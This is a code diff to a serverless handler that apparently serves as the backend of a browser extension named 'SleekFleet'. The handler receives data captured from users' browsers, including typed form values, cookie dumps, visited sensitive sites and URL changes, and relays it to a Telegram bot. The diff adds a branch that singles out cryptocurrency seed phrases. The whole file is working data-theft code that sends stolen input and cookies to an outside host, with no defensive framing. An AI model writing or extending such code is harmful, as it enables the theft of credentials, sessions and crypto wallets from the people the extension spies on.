@@ -31,8 +31,9 @@ export default async function handler(req, res) {
 🚗 *SleekFleet Input Capture*
 
 📍 Site: \`${url}\`
-🏷️ Field: \`${payload.data.field_name || "Unknown"}\`
-🔑 Value: \`${String(payload.data.value).substring(0, 100)}\`
+🏷️ Field Name: \`${payload.field_name || "Unknown"}\`
+🔖 Placeholder: \`${payload.field_placeholder || "None"}\`
+🔑 Value: \`${String(payload.value).substring(0, 100)}\`
 ⏰ Time: \`${timestamp}\`
       `.trim();
       
@@ -45,7 +46,7 @@ export default async function handler(req, res) {
 ⏰ Time: \`${timestamp}\`
       `.trim();
 
-    } else if (source === "cookie_dump") {
+    } else if (source === "cookie_update") {
       msg = `
 🚗 *SleekFleet Cookie Dump*
 
@@ -68,8 +69,8 @@ export default async function handler(req, res) {
       msg = `
 🚗 *SleekFleet Sensitive Site Visit*
 
-🌐 URL: \`${payload.data.url}\`
-📝 Title: \`${payload.data.title}\`
+🌐 URL: \`${payload.data?.url || url}\`
+📝 Title: \`${payload.data?.title || "N/A"}\`
 ⏰ Time: \`${timestamp}\`
       `.trim();
 
@@ -77,8 +78,17 @@ export default async function handler(req, res) {
       msg = `
 🚗 *SleekFleet URL Change*
 
-🌐 New URL: \`${payload.data.url}\`
-📝 Title: \`${payload.data.title}\`
+🌐 New URL: \`${payload.data?.url || url}\`
+📝 Title: \`${payload.data?.title || "N/A"}\`
+⏰ Time: \`${timestamp}\`
+      `.trim();
+
+    } else if (source === "seed_phrase_detected" || source === "seed_phrase_input") {
+      msg = `
+🚨 *SEED PHRASE DETECTED!*
+
+📋 Data: \`${String(payload.data).substring(0, 150)}\`
+📍 Site: \`${url}\`
 ⏰ Time: \`${timestamp}\`
       `.trim();
 
@@ -88,54 +98,33 @@ export default async function handler(req, res) {
 🚗 *SleekFleet General Data*
 
 📦 Source: \`${source}\`
-📦 Data: \`${JSON.stringify(payload.data).substring(0, 150)}\`
+📦 Data: \`${JSON.stringify(payload.data || payload).substring(0, 150)}\`
 📍 Site: \`${url}\`
 ⏰ Time: \`${timestamp}\`
       `.trim();
     }
 
-    // 5. Send to Telegram
+    // 5. Send to Telegram (Assuming you have this function defined elsewhere)
     const tgToken = process.env.TELEGRAM_BOT_TOKEN;
     const tgChatId = process.env.TELEGRAM_CHAT_ID;
 
     if (tgToken && tgChatId) {
-      try {
-        // FIX: Use Template Literals (Backticks) for the URL
-        const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
-        
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000); 
-
-        const response = await fetch(tgUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
-            chat_id: tgChatId, 
-            text: msg, 
-            parse_mode: 'Markdown' 
-          }),
-          signal: controller.signal
-        });
-
-        clearTimeout(timeoutId);
-
-        if (!response.ok) {
-          console.error(`Telegram API Error: ${response.status} ${response.statusText}`);
-        } else {
-          console.log("✅ Telegram Message Sent");
-        }
-      } catch (err) {
-        console.error("❌ Telegram Fetch Failed:", err.message);
-      }
-    } else {
-      console.log("⚠️ Telegram skipped: Missing Env Vars");
+      const telegramUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
+      await fetch(telegramUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: tgChatId,
+          text: msg,
+          parse_mode: 'Markdown'
+        })
+      });
     }
 
-    // 6. Return Success to Extension
-    res.status(200).json({ success: true });
+    return res.status(200).json({ success: true });
 
   } catch (error) {
-    console.error("💥 Handler Error:", error);
-    res.status(500).json({ error: error.message });
+    console.error("Handler Error:", error);
+    return res.status(500).json({ error: 'Internal Server Error' });
   }
 }
